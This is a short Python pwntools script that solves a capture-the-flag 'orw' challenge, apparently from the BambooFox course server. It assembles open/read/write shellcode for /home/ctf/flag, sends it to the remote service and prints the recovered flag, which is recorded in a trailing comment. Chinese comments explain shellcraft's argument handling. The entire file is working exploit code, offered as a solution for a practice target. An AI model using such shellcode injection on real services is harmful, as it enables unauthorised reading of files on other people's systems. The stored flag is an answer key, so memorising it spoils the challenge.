#coding:utf-8
from pwn import *
# nc bamboofox.cs.nctu.edu.tw 11100
host="bamboofox.cs.nctu.edu.tw"
port=11100
flagfile="/home/ctf/flag"

fopen=shellcraft.open(flagfile,0,0)
fread=shellcraft.read(3,flagfile,0x60)
write=shellcraft.write(1,'',0x60)  #write的第二个参数根本不影响,
#在shellcraft里如果填数字的话,就asm成地址,而填字符串,就asm成先把字符压栈,然后把栈上的东西print出来
sc=fopen+fread+write
sc=asm(sc)


p=remote(host,port)
print p.recvuntil("here:")
p.send(sc)
print p.recvuntil("}")
# p.interactive()


'''
BAMBOOFOX{Congratulations_you_beat_the_orw_challenge!!}
'''
